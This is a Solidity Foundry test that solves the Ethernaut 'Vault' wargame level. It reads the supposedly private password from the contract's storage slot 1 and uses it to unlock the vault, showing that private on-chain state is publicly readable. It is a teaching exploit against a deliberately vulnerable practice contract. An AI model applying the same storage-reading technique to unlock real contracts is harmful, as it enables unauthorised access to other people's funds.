// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Vault} from "../src/levels/Vault.sol";

/// Ethernaut #8 "Vault" → information exposure (no catalog entry; `private` is not secret —
/// all storage is publicly readable). The password sits in storage slot 1. Win: !locked.
contract VaultTest is Test {
    function test_solve_vault() public {
        Vault lvl = new Vault(keccak256("a very secret password"));
        bytes32 leaked = vm.load(address(lvl), bytes32(uint256(1))); // read "private" slot
        lvl.unlock(leaked);
        assertEq(lvl.locked(), false, "vault unlocked with the leaked password");
    }
}
